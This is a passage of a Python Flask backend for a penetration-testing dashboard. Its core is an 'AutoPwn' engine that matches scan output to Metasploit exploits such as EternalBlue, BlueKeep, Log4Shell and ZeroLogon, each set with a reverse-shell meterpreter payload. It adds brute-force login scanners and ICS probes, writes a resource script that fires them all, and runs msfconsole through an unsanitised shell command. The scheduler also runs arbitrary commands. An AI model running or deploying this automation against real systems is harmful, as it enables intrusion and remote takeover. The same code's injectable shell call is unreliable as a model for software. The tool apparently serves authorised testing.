                        j["output"].append(line.rstrip("\n"))
                    proc.wait(); j["return_code"] = proc.returncode
                    if j["status"] == "running":
                        j["status"] = "completed" if proc.returncode == 0 else "error"
                except Exception as e:
                    j["output"].append(f"[ERROR] {e}"); j["status"] = "error"
                finally:
                    j["finished_at"] = datetime.now().isoformat(); j.pop("proc", None)
            threading.Thread(target=_run_sched, daemon=True).start()
            with SCHEDULES_LOCK:
                nxt = _next_run_iso(sched["next_run"], sched.get("repeat","once"))
                if nxt:
                    SCHEDULES[sched["id"]]["next_run"] = nxt
                else:
                    SCHEDULES[sched["id"]]["enabled"] = False

threading.Thread(target=_scheduler_worker, daemon=True).start()

@app.route("/api/schedules", methods=["GET"])
@api_login_required
def list_schedules():
    pid = request.args.get("project_id","")
    with SCHEDULES_LOCK:
        result = [s for s in SCHEDULES.values() if not pid or s.get("project_id") == pid]
    return jsonify(sorted(result, key=lambda s: s.get("next_run","")))

@app.route("/api/schedules", methods=["POST"])
@api_login_required
def create_schedule():
    d = request.json
    if not d.get("command") or not d.get("next_run"):
        return jsonify({"error": "command and next_run required"}), 400
    sched = {
        "id": str(uuid.uuid4()), "name": d.get("name","Scheduled Job"),
        "command": d["command"], "project_id": d.get("project_id",""),
        "repeat": d.get("repeat","once"), "next_run": d["next_run"],
        "enabled": True, "created_at": datetime.now().isoformat(),
    }
    with SCHEDULES_LOCK:
        SCHEDULES[sched["id"]] = sched
    return jsonify(sched), 201

@app.route("/api/schedules/<sched_id>", methods=["DELETE"])
@api_login_required
def delete_schedule(sched_id):
    with SCHEDULES_LOCK:
        SCHEDULES.pop(sched_id, None)
    return jsonify({"ok": True})

@app.route("/api/schedules/<sched_id>/toggle", methods=["POST"])
@api_login_required
def toggle_schedule(sched_id):
    with SCHEDULES_LOCK:
        sched = SCHEDULES.get(sched_id)
        if not sched:
            return jsonify({"error": "Not found"}), 404
        sched["enabled"] = not sched.get("enabled", True)
    return jsonify(sched)


# ── YAML Editor ────────────────────────────────────────────────────────────

@app.route("/api/tools/files", methods=["GET"])
@api_login_required
def list_yaml_files():
    return jsonify(sorted(f.stem for f in TOOLS_DIR.glob("*.yaml")))

@app.route("/api/tools/files/<name>", methods=["GET"])
@api_login_required
def read_yaml_file(name):
    if not re.match(r'^[\w_-]+$', name):
        return jsonify({"error": "Invalid name"}), 400
    fp = TOOLS_DIR / f"{name}.yaml"
    if not fp.exists():
        return jsonify({"error": "Not found"}), 404
    return jsonify({"name": name, "content": fp.read_text(encoding="utf-8")})

@app.route("/api/tools/files/<name>", methods=["PUT"])
@api_login_required
def write_yaml_file(name):
    if not re.match(r'^[\w_-]+$', name):
        return jsonify({"error": "Invalid name"}), 400
    content = request.json.get("content", "")
    try:
        yaml.safe_load(content)
    except yaml.YAMLError as e:
        return jsonify({"error": f"YAML inválido: {e}"}), 400
    (TOOLS_DIR / f"{name}.yaml").write_text(content, encoding="utf-8")
    return jsonify({"ok": True})

@app.route("/api/tools/files/<name>", methods=["POST"])
@api_login_required
def create_yaml_file(name):
    if not re.match(r'^[\w_-]+$', name):
        return jsonify({"error": "Invalid name"}), 400
    fp = TOOLS_DIR / f"{name}.yaml"
    if fp.exists():
        return jsonify({"error": "Ya existe"}), 409
    fp.write_text(f'tools:\n  - name: "Nueva Herramienta"\n    description: "Descripción"\n    command: "cmd --help"\n    params:\n      - name: rhost\n        label: Target IP\n        placeholder: "10.10.10.10"\n        required: true\n    tags: ["{name}"]\n    notes: ""\n', encoding="utf-8")
    return jsonify({"ok": True}), 201

@app.route("/api/tools/files/<name>", methods=["DELETE"])
@api_login_required
def delete_yaml_file(name):
    if not re.match(r'^[\w_-]+$', name):
        return jsonify({"error": "Invalid name"}), 400
    fp = TOOLS_DIR / f"{name}.yaml"
    if fp.exists():
        fp.unlink()
    return jsonify({"ok": True})


# ── Global Search ──────────────────────────────────────────────────────────

@app.route("/api/search")
@api_login_required
def global_search():
    q = request.args.get("q","").lower().strip()
    if len(q) < 2:
        return jsonify([])
    results = []
    for fpath in PROJECTS_DIR.glob("*.json"):
        try:
            with open(fpath, encoding="utf-8") as f:
                p = json.load(f)
        except Exception:
            continue
        pid, pname = p["id"], p.get("name","")
        def add(t, v, d=""):
            results.append({"type":t,"value":str(v)[:100],"desc":str(d)[:80],"project_id":pid,"project_name":pname})
        if q in pname.lower() or q in p.get("client","").lower():
            add("project", pname, p.get("client",""))
        for tgt in (p.get("targets",[]) + p.get("domains",[])):
            if q in tgt.lower(): add("target", tgt, pname)
        for item in p.get("loot",[]):
            if q in item.get("value","").lower() or q in item.get("desc","").lower():
                add("loot", item["value"], f"{item.get('type','')} · {item.get('source','')}")
        for fi in p.get("findings",[]):
            if q in fi.get("title","").lower() or q in fi.get("description","").lower():
                add("finding", fi["title"], f"{fi.get('severity','')} · {fi.get('status','')}")
        for cmd in p.get("commands",[]):
            if q in cmd.get("command","").lower() or q in cmd.get("tool","").lower():
                add("command", cmd["command"], cmd.get("tool",""))
        if p.get("notes") and q in p["notes"].lower():
            idx = p["notes"].lower().index(q)
            add("note", p["notes"][max(0,idx-20):idx+50], pname)
    return jsonify(results[:50])


# ── Timeline ───────────────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/timeline")
@api_login_required
def project_timeline(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    events = [{"type":"project_created","ts":project["created_at"],"title":"Proyecto creado","desc":project["name"]}]
    for cmd in (project.get("commands") or []):
        events.append({"type":"command","ts":cmd["timestamp"],"title":cmd["tool"],"desc":cmd["command"][:100],"phase":cmd.get("phase","")})
    for item in (project.get("loot") or []):
        events.append({"type":"loot","ts":item.get("timestamp",project["created_at"]),"title":f"Loot: {item['type']}","desc":item["value"][:60]})
    for fi in (project.get("findings") or []):
        events.append({"type":"finding","ts":fi["created_at"],"title":fi["title"],"desc":fi.get("severity",""),"severity":fi.get("severity","")})
    with JOBS_LOCK:
        for j in JOBS.values():
            if j.get("project_id") == project_id:
                ts = j.get("finished_at") or j.get("started_at","")
                events.append({"type":"job","ts":ts,"title":f"Job: {j['tool']}","desc":j["command"][:80],"status":j["status"]})
    events.sort(key=lambda e: e.get("ts",""), reverse=True)
    return jsonify(events)


# ── Host Status (Network Map) ──────────────────────────────────────────────

@app.route("/api/projects/<project_id>/host_status", methods=["PUT"])
@api_login_required
def update_host_status(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["host_status"] = request.json
    write_project(project)
    return jsonify({"ok": True})


# ── Port Map ─────────────────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/ports", methods=["GET"])
@api_login_required
def get_ports(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project.get("ports", []))

@app.route("/api/projects/<project_id>/ports", methods=["PUT"])
@api_login_required
def save_ports(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["ports"] = request.json
    write_project(project)
    return jsonify({"ok": True})

# ── AutoPwn Engine ───────────────────────────────────────────────────────────

# Maps vulnerability signatures to Metasploit modules
AUTOPWN_MSF_MAP = [
    {
        "id": "eternalblue",
        "triggers": ["ms17-010", "eternalblue", "vulnerable to ms17-010",
                     "windows server 2008", "windows server 2012", "windows 7", "windows vista"],
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"},
        "desc": "EternalBlue SMB RCE (MS17-010)",
    },
    {
        "id": "eternalromance",
        "triggers": ["ms17-010", "eternalblue", "windows server 2008", "windows 7"],
        "module": "exploit/windows/smb/ms17_010_psexec",
        "options": {"PAYLOAD": "windows/meterpreter/reverse_tcp"},
        "desc": "EternalRomance / PSExec (MS17-010 fallback)",
    },
    {
        "id": "ms08_067",
        "triggers": ["ms08-067", "windows xp", "windows server 2003", "vulnerable to ms08-067"],
        "module": "exploit/windows/smb/ms08_067_netapi",
        "options": {"PAYLOAD": "windows/meterpreter/reverse_tcp"},
        "desc": "MS08-067 NetAPI RCE (WinXP/2003)",
    },
    {
        "id": "vsftpd",
        "triggers": ["vsftpd 2.3.4", "vsftpd_234"],
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "options": {"PAYLOAD": "cmd/unix/interact"},
        "desc": "vsFTPd 2.3.4 Backdoor",
    },
    {
        "id": "bluekeep",
        "triggers": ["cve-2019-0708", "bluekeep"],
        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "TARGET": "2"},
        "desc": "BlueKeep RDP RCE (CVE-2019-0708)",
    },
    {
        "id": "log4shell",
        "triggers": ["cve-2021-44228", "log4shell", "log4j"],
        "module": "exploit/multi/misc/log4shell_header_injection",
        "options": {"PAYLOAD": "java/meterpreter/reverse_tcp"},
        "desc": "Log4Shell JNDI RCE (CVE-2021-44228)",
    },
    {
        "id": "shellshock",
        "triggers": ["shellshock", "cve-2014-6271", "bash vulnerable"],
        "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "options": {"PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "TARGETURI": "/cgi-bin/test.cgi"},
        "desc": "Shellshock CGI RCE (CVE-2014-6271)",
    },
    {
        "id": "spring4shell",
        "triggers": ["spring4shell", "cve-2022-22965", "spring framework rce"],
        "module": "exploit/multi/http/spring_framework_rce_spring4shell",
        "options": {"PAYLOAD": "java/meterpreter/reverse_tcp"},
        "desc": "Spring4Shell RCE (CVE-2022-22965)",
    },
    {
        "id": "printnightmare",
        "triggers": ["printnightmare", "cve-2021-1675", "cve-2021-34527"],
        "module": "exploit/windows/local/cve_2021_1675_printnightmare",
        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "SESSION": "1"},
        "desc": "PrintNightmare LPE/RCE (CVE-2021-1675)",
    },
    {
        "id": "zerologon",
        "triggers": ["zerologon", "cve-2020-1472"],
        "module": "exploit/windows/dcerpc/cve_2020_1472_zerologon",
        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"},
        "desc": "ZeroLogon Netlogon RCE (CVE-2020-1472)",
    },
    {
        "id": "heartbleed",
        "triggers": ["heartbleed", "cve-2014-0160"],
        "module": "auxiliary/scanner/ssl/openssl_heartbleed",
        "options": {"ACTION": "DUMP"},
        "desc": "Heartbleed OpenSSL Info Disclosure (CVE-2014-0160)",
    },
    {
        "id": "redis_rce",
        "triggers": ["redis", "pong", "redis_server", "unauthorized"],
        "module": "exploit/linux/redis/redis_replication_cmd_exec",
        "options": {"PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
        "desc": "Redis Unauthenticated RCE via Replication",
    },
    {
        "id": "struts_rce",
        "triggers": ["apache struts", "cve-2017-5638", "s2-045"],
        "module": "exploit/multi/http/struts2_content_type_ognl",
        "options": {"PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
        "desc": "Apache Struts2 RCE (CVE-2017-5638 / S2-045)",
    },
    {
        "id": "ms12_020",
        "triggers": ["ms12-020", "rdp denial", "3389"],
        "module": "auxiliary/scanner/rdp/ms12_020_maxchannelids",
        "options": {},
        "desc": "MS12-020 RDP Vulnerability Check",
    },
    {
        "id": "double_pulsar",
        "triggers": ["doublepulsar", "double-pulsar"],
        "module": "exploit/windows/smb/smb_doublepulsar_rce",
        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"},
        "desc": "DoublePulsar SMB Backdoor RCE",
    },
]

# Port → MSF auxiliary scanner map (default creds / info gathering)
AUTOPWN_PORT_SCANNERS = {
    22:    [("auxiliary/scanner/ssh/ssh_login",
             {"USERNAME": "root", "PASS_FILE": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt", "STOP_ON_SUCCESS": "true", "THREADS": "5", "BRUTEFORCE_SPEED": "4"}, "SSH Default Creds"),
            ("auxiliary/scanner/ssh/ssh_version", {}, "SSH Version")],
    21:    [("auxiliary/scanner/ftp/anonymous", {}, "FTP Anonymous"),
            ("auxiliary/scanner/ftp/ftp_login",
             {"USER_FILE": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt", "PASS_FILE": "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt", "STOP_ON_SUCCESS": "true"}, "FTP Default Creds")],
    3306:  [("auxiliary/scanner/mysql/mysql_login",
             {"USERNAME": "root", "PASSWORD": "", "STOP_ON_SUCCESS": "true"}, "MySQL Empty Root"),
            ("auxiliary/admin/mysql/mysql_enum", {}, "MySQL Enumeration")],
    5432:  [("auxiliary/scanner/postgres/postgres_login", {}, "PostgreSQL Default Creds")],
    1433:  [("auxiliary/scanner/mssql/mssql_login", {}, "MSSQL Default Creds"),
            ("auxiliary/admin/mssql/mssql_enum", {}, "MSSQL Enumeration")],
    27017: [("auxiliary/scanner/mongodb/mongodb_login", {}, "MongoDB No-Auth"),
            ("auxiliary/gather/mongodb_js_inject_collection_enum", {}, "MongoDB Data Dump")],
    6379:  [("auxiliary/scanner/redis/redis_server", {}, "Redis No-Auth Info"),
            ("auxiliary/gather/redis_extractor", {}, "Redis Data Extractor")],
    5900:  [("auxiliary/scanner/vnc/vnc_login", {"STOP_ON_SUCCESS": "true"}, "VNC Auth Bypass"),
            ("auxiliary/scanner/vnc/vnc_none_auth", {}, "VNC No-Auth Check")],
    5901:  [("auxiliary/scanner/vnc/vnc_login", {"RPORT": "5901", "STOP_ON_SUCCESS": "true"}, "VNC5901 Auth Bypass")],
    161:   [("auxiliary/scanner/snmp/snmp_login", {}, "SNMP Community Strings"),
            ("auxiliary/scanner/snmp/snmp_enum", {"VERSION": "2c", "COMMUNITY": "public"}, "SNMP Enumeration")],
    623:   [("auxiliary/scanner/ipmi/ipmi_version", {}, "IPMI Version"),
            ("auxiliary/scanner/ipmi/ipmi_dumphashes", {}, "IPMI Hash Dump")],
    11211: [("auxiliary/scanner/memcached/memcached_amp", {}, "Memcached Amplification Check")],
    9200:  [("auxiliary/scanner/elasticsearch/indices_enum", {}, "Elasticsearch Index Enum")],
    2049:  [("auxiliary/scanner/nfs/nfsmount", {}, "NFS Shares Enum")],
    512:   [("auxiliary/scanner/rservices/rexec_login", {"USERNAME": "root", "PASSWORD": ""}, "RSH/Rexec No-Auth")],
    513:   [("auxiliary/scanner/rservices/rlogin_login", {"USERNAME": "root", "PASSWORD": ""}, "Rlogin No-Auth")],
    80:    [("auxiliary/scanner/http/http_header",       {},                          "HTTP Headers / Server Info"),
            ("auxiliary/scanner/http/dir_scanner",       {},                          "HTTP Directory Scanner"),
            ("auxiliary/scanner/http/files_dir",         {},                          "HTTP Sensitive Files"),
            ("auxiliary/scanner/http/options",           {},                          "HTTP Methods Allowed"),
            ("auxiliary/scanner/http/http_login",        {"AUTH_URI": "/manager/html"}, "HTTP Basic Auth Brute")],
    8000:  [("auxiliary/scanner/http/http_header",       {"RPORT": "8000"},           "HTTP:8000 Headers"),
            ("auxiliary/scanner/http/dir_scanner",       {"RPORT": "8000"},           "HTTP:8000 Dir Scanner")],
    8888:  [("auxiliary/scanner/http/http_header",       {"RPORT": "8888"},           "HTTP:8888 Headers"),
            ("auxiliary/scanner/jupyter/jupyter_login",  {"RPORT": "8888"},           "Jupyter Notebook No-Auth")],
    3000:  [("auxiliary/scanner/http/http_header",       {"RPORT": "3000"},           "HTTP:3000 Headers (Node/Grafana)"),
            ("auxiliary/scanner/http/grafana_plugin_scanner", {"RPORT": "3000"},      "Grafana Plugin Scanner")],
    4000:  [("auxiliary/scanner/http/http_header",       {"RPORT": "4000"},           "HTTP:4000 Headers")],
    9090:  [("auxiliary/scanner/http/http_header",       {"RPORT": "9090"},           "HTTP:9090 Headers (Prometheus)")],
    8080:  [("auxiliary/scanner/http/tomcat_mgr_login",  {},                          "Tomcat Manager Default Creds"),
            ("auxiliary/scanner/http/http_header",       {"RPORT": "8080"},           "HTTP:8080 Headers"),
            ("auxiliary/scanner/http/dir_scanner",       {"RPORT": "8080"},           "HTTP:8080 Dir Scanner")],
    8443:  [("auxiliary/scanner/http/tomcat_mgr_login",  {"RPORT": "8443"},           "Tomcat HTTPS Default Creds"),
            ("auxiliary/scanner/http/cert",              {"RPORT": "8443"},           "SSL:8443 Certificate Info")],
    443:   [("auxiliary/scanner/http/cert",              {},                          "SSL Certificate Info"),
            ("auxiliary/scanner/http/http_header",       {"RPORT": "443", "SSL": "true"}, "HTTPS Headers"),
            ("auxiliary/scanner/http/dir_scanner",       {"RPORT": "443", "SSL": "true"}, "HTTPS Dir Scanner")],
    445:   [("auxiliary/scanner/smb/smb_ms17_010", {}, "EternalBlue Check"),
            ("auxiliary/scanner/smb/smb_enumshares", {"SpiderShares": "false"}, "SMB Share Enum"),
            ("auxiliary/scanner/smb/smb_lookupsid", {}, "SMB SID Lookup")],
    139:   [("auxiliary/scanner/smb/smb_ms17_010", {}, "EternalBlue Check (139)")],
    25:    [("auxiliary/scanner/smtp/smtp_enum", {}, "SMTP User Enum"),
            ("auxiliary/scanner/smtp/smtp_relay", {}, "SMTP Open Relay Check")],
    110:   [("auxiliary/scanner/pop3/pop3_login", {"USERNAME": "admin", "PASSWORD": "admin"}, "POP3 Default Creds")],
    143:   [("auxiliary/scanner/imap/imap_login", {"USERNAME": "admin", "PASSWORD": "admin"}, "IMAP Default Creds")],
    3389:  [("auxiliary/scanner/rdp/ms12_020_maxchannelids", {}, "MS12-020 RDP Check"),
            ("auxiliary/scanner/rdp/rdp_scanner", {}, "RDP Version Scan")],
    5985:  [("auxiliary/scanner/winrm/winrm_auth_methods", {}, "WinRM Auth Methods")],
    47808: [("auxiliary/scanner/bacnet/bacnet_device_info", {}, "BACnet ICS Device Info")],
    102:   [("auxiliary/scanner/scada/siemens_s7_300_400_info", {}, "Siemens S7 ICS Info")],
    502:   [("auxiliary/scanner/scada/modbus_detect", {}, "Modbus ICS Detection")],
}

def generate_msf_resource(rhost, lhost, lport, loot_texts, ports):
    """Generate a Metasploit resource script based on detected vulnerabilities and open ports."""
    vuln_text = " ".join(loot_texts).lower()
    port_nums = {int(p.get("port", 0)) for p in ports if p.get("port")}

    # Also include port/service/version strings so nmap version data triggers exploits
    version_text = " ".join(
        f"{p.get('port','')} {p.get('service','')} {p.get('version','')}"
        for p in ports
    ).lower()
    vuln_text = vuln_text + " " + version_text

    lines = [
        "# ═══════════════════════════════════════════════════════════════════",
        f"# AutoPwn Resource Script — Generated by PentestSuite",
        f"# Target: {rhost}  |  LHOST: {lhost}  |  LPORT: {lport}",
        "# ═══════════════════════════════════════════════════════════════════",
        f"spool /tmp/autopwn_{rhost.replace('.', '_')}.log",
        "",
        "# Global options",
        f"setg RHOSTS {rhost}",
        f"setg LHOST {lhost}",
        f"setg LPORT {lport}",
        "setg VERBOSE false",
        "setg ConnectTimeout 10",
        "setg ExitOnSession false",
        "",
        "# Start multi/handler in background",
        "use exploit/multi/handler",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",
        "run -j -z",
        "sleep 2",
        "",
    ]

    matched_exploits = []
    lport_offset = 1

    # Match vuln signatures → MSF exploit modules
    for entry in AUTOPWN_MSF_MAP:
        if any(t in vuln_text for t in entry["triggers"]):
            matched_exploits.append(entry)
            lines.append(f"# ── {entry['desc']} ──────────────────────────────")
            lines.append(f"use {entry['module']}")
            lines.append(f"set RHOSTS {rhost}")
            lines.append(f"set LHOST {lhost}")
            lines.append(f"set LPORT {int(lport) + lport_offset}")
            for opt, val in entry["options"].items():
                lines.append(f"set {opt} {val}")
            lines.append("run -j")
            lines.append("sleep 5")
            lines.append("")
            lport_offset += 1

    # Port-based scanner/auxiliary modules
    lines.append("# ── Port-based Auxiliary Scanners ────────────────────────")
    scanned_ports = set()
    for port in sorted(port_nums):
        if port in AUTOPWN_PORT_SCANNERS and port not in scanned_ports:
            scanned_ports.add(port)
            for module, opts, desc in AUTOPWN_PORT_SCANNERS[port]:
                lines.append(f"# {desc} (port {port})")
                lines.append(f"use {module}")
                lines.append(f"set RHOSTS {rhost}")
                for opt, val in opts.items():
                    if opt != "RPORT":
                        lines.append(f"set {opt} {val}")
                    else:
                        lines.append(f"set RPORT {val}")
                lines.append("run")
                lines.append("")

    # Web exploits based on HTTP ports
    web_ports = port_nums & {80, 443, 8080, 8443, 8000, 3000, 8888}
    if web_ports:
        web_port = sorted(web_ports)[0]
        lines += [
            "# ── Web Vulnerability Modules ────────────────────────────────",
            "use auxiliary/scanner/http/http_header",
            f"set RHOSTS {rhost}",
            f"set RPORT {web_port}",
            "run",
            "",
            "use auxiliary/scanner/http/dir_scanner",
            f"set RHOSTS {rhost}",
            f"set RPORT {web_port}",
            "set PATH /",
            "run",
            "",
            "use auxiliary/scanner/http/files_dir",
            f"set RHOSTS {rhost}",
            f"set RPORT {web_port}",
            "run",
            "",
        ]
        if "tomcat" in vuln_text or 8080 in port_nums:
            lines += [
                "# Tomcat Manager Deploy (if creds found)",
                "use exploit/multi/http/tomcat_mgr_upload",
                f"set RHOSTS {rhost}",
                "set RPORT 8080",
                f"set LHOST {lhost}",
                f"set LPORT {int(lport) + lport_offset}",
                "set PAYLOAD java/meterpreter/reverse_tcp",
                "run -j",
                "",
            ]
            lport_offset += 1
        if "jenkins" in vuln_text or "jenkins" in " ".join(p.get("service", "") for p in ports).lower():
            lines += [
                "# Jenkins Script Console RCE",
                "use exploit/multi/http/jenkins_script_console",
                f"set RHOSTS {rhost}",
                f"set LHOST {lhost}",
                f"set LPORT {int(lport) + lport_offset}",
                "set PAYLOAD java/meterpreter/reverse_tcp",
                "run -j",
                "",
            ]
            lport_offset += 1

    lines += [
        "# ── Final — Session check ────────────────────────────────────────",
        "sleep 15",
        "sessions -l",
        "spool off",
        "# ═══════════════════════════════════════════════════════════════════",
        f"# END AutoPwn — {len(matched_exploits)} CVE exploits + {len(scanned_ports)} port scanners",
        "# ═══════════════════════════════════════════════════════════════════",
    ]

    return "\n".join(lines), len(matched_exploits), len(scanned_ports)


@app.route("/api/projects/<project_id>/autopwn/generate", methods=["POST"])
@api_login_required
def autopwn_generate(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    data = request.json or {}
    rhost  = data.get("rhost") or (project.get("targets") or [""])[0] or ""
    lhost  = data.get("lhost") or "10.10.14.1"
    lport  = data.get("lport", 4444)

    if not rhost:
        return jsonify({"error": "RHOST requerido (configura en Global Vars)"}), 400

    ports = project.get("ports", [])

    # Gather all text from loot + findings to detect vuln signatures
    loot_texts = [item.get("value", "") for item in project.get("loot", [])]
    for finding in project.get("findings", []):
        loot_texts.append(finding.get("title", "") + " " + finding.get("description", ""))

    rc_script, n_exploits, n_scanners = generate_msf_resource(rhost, lhost, int(lport), loot_texts, ports)

    safe_host = rhost.replace(".", "_").replace(":", "_")
    rc_filename = os.path.join(tempfile.gettempdir(), f"autopwn_{safe_host}.rc")
    try:
        with open(rc_filename, "w") as f:
            f.write(rc_script)
        rc_saved = True
    except Exception:
        rc_saved = False

    return jsonify({
        "script":    rc_script,
        "path":      rc_filename if rc_saved else None,
        "cmd":       f"msfconsole -q -r {rc_filename}" if rc_saved else None,
        "exploits":  n_exploits,
        "scanners":  n_scanners,
        "rhost":     rhost,
        "lhost":     lhost,
        "lport":     lport,
    })


@app.route("/api/projects/<project_id>/autopwn/run", methods=["POST"])
@api_login_required
def autopwn_run(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    data   = request.json or {}
    rc_path = data.get("rc_path", "")

    if not rc_path:
        return jsonify({"error": "rc_path requerido — genera el script primero"}), 400

    command = f"msfconsole -q -r {rc_path} 2>&1"
    job_id  = str(uuid.uuid4())
    job = {
        "id":         job_id,
        "project_id": project_id,
        "tool":       "AutoPwn (MSF)",
        "phase":      "exploitation",
        "command":    command,
        "status":     "running",
        "output":     [],
        "started_at": datetime.now().isoformat(),
        "finished_at": None,
    }

    with JOBS_LOCK:
        JOBS[job_id] = job

    def _run():
        try:
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, start_new_session=True,
            )
            job["proc"] = proc
            job["pid"]  = proc.pid
            for line in proc.stdout:
                line = line.rstrip("\n")
                job["output"].append(line)
            proc.wait()
            job["status"] = "done" if proc.returncode == 0 else "error"
        except Exception as e:
            job["output"].append(f"[ERROR] {e}")
            job["status"] = "error"
        finally:
            job["finished_at"] = datetime.now().isoformat()
            job.pop("proc", None)

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id}), 202


# ── Project Enrich — version CVE + searchsploit scan ────────────────────────

@app.route("/api/projects/<project_id>/enrich", methods=["POST"])
@api_login_required
def enrich_project(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    ports   = project.get("ports", [])
    rhost   = (project.get("targets") or [""])[0] or ""
    now_iso = datetime.now().isoformat()

    existing_titles = {f.get("title", "") for f in project.get("findings", [])}
    new_findings = []

    # 1. Apply VERSION_CVE_MAP against all known ports
    for p in ports:
        f = _match_version_cve(p, rhost)
        if f and f["title"] not in existing_titles:
            existing_titles.add(f["title"])
            f["created_at"] = now_iso
            new_findings.append(f)

    # 2. Searchsploit per unique service+version (background-safe, short timeout)
    seen_queries = set()
    ss_count = 0
    for p in ports:
        ver = (p.get("version") or "").strip()
        svc = (p.get("service") or "").strip()
        if not ver or len(ver) < 3:
            continue
        query = re.sub(r'[^a-zA-Z0-9 ./\-_]', '', f"{svc} {ver}")[:60].strip()
        if not query or query in seen_queries:
            continue
        seen_queries.add(query)
        try:
            res = subprocess.run(
                ["searchsploit", "--json", query],
                capture_output=True, text=True, timeout=8
            )
            if res.returncode != 0 or not res.stdout.strip():
                continue
            data = json.loads(res.stdout)
            for e in (data.get("RESULTS_EXPLOIT") or [])[:3]:
                edb = str(e.get("EDB-ID", ""))
                title = f"[Searchsploit] {e.get('Title', query)[:80]}"
                if title in existing_titles:
                    continue
                existing_titles.add(title)
                path = e.get("Path", "")
                new_findings.append({
                    "id":          str(uuid.uuid4()),
                    "title":       title,
                    "severity":    "high",
                    "status":      "open",
                    "cve":         "",
                    "cvss":        None,
                    "description": f"Exploit disponible para '{query}' — Path: {path}",
                    "evidence":    f"EDB-ID: {edb}",
                    "hosts":       [rhost] if rhost else [],
                    "source":      "searchsploit-enrich",
                    "created_at":  now_iso,
                })
                ss_count += 1
        except Exception:
            pass

    for f in new_findings:
        project.setdefault("findings", []).append(f)

    if new_findings:
        write_project(project)

    return jsonify({
        "added":       len(new_findings),
        "version_hits": len(new_findings) - ss_count,
        "ss_hits":     ss_count,
    })


# ── Credential Matrix ────────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/credential_matrix", methods=["GET"])
@api_login_required
def get_cred_matrix(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project.get("credential_matrix",
                               {"users": [], "services": [], "results": {}}))

@app.route("/api/projects/<project_id>/credential_matrix", methods=["PUT"])
@api_login_required
def save_cred_matrix(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["credential_matrix"] = request.json
    write_project(project)
    return jsonify({"ok": True})

# ── Attack Path ──────────────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/attack_path", methods=["GET"])
@api_login_required
def get_attack_path(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project.get("attack_path", {"nodes": [], "edges": []}))

@app.route("/api/projects/<project_id>/attack_path", methods=["PUT"])
@api_login_required
def save_attack_path(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["attack_path"] = request.json
    write_project(project)
    return jsonify({"ok": True})

# ── Wordlist Browser ─────────────────────────────────────────────────────────

_WORDLIST_ROOTS = [
    Path("/usr/share/wordlists"),
    Path("/usr/share/seclists"),
    Path("/opt/SecLists"),
]

@app.route("/api/wordlists")
@api_login_required
def browse_wordlists():
    path_str = request.args.get("path", "").strip()
    if not path_str:
        return jsonify([{"name": r.name, "path": str(r), "type": "dir"}
                        for r in _WORDLIST_ROOTS if r.exists()])
    browse_path = Path(path_str).resolve()
    roots_resolved = [r.resolve() for r in _WORDLIST_ROOTS if r.exists()]
    if not any(str(browse_path).startswith(str(root)) for root in roots_resolved):
        return jsonify({"error": "Access denied"}), 403
    if not browse_path.exists():
        return jsonify({"error": "Not found"}), 404
    if browse_path.is_file():
        return jsonify({"name": browse_path.name, "path": str(browse_path),
                        "type": "file", "size": browse_path.stat().st_size})
    try:
        items = []
        for item in sorted(browse_path.iterdir(),
                           key=lambda x: (x.is_file(), x.name.lower())):
            entry = {"name": item.name, "path": str(item),
                     "type": "dir" if item.is_dir() else "file"}
            if item.is_file():
                try:
                    entry["size"] = item.stat().st_size
                except Exception:
                    entry["size"] = 0
            items.append(entry)
        return jsonify(items)
    except PermissionError:
        return jsonify({"error": "Permission denied"}), 403

# ── Screenshots ──────────────────────────────────────────────────────────────

SCREENSHOTS_DIR = BASE_DIR / "data" / "screenshots"
SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)

@app.route("/api/projects/<project_id>/screenshots")
@api_login_required
def list_screenshots(project_id):
    if not re.match(r'^[\w\-]+$', project_id):
        return jsonify({"error": "Invalid"}), 400
    d = SCREENSHOTS_DIR / project_id
    if not d.exists():
        return jsonify([])
    shots = []
    for ext in ("*.png", "*.jpg", "*.jpeg"):
        shots.extend(d.glob(ext))
    return jsonify(sorted(
        [{"filename": f.name,
          "url": f"/api/screenshots/{project_id}/{f.name}",
          "ts": f.stat().st_mtime} for f in shots],
        key=lambda x: x["ts"], reverse=True
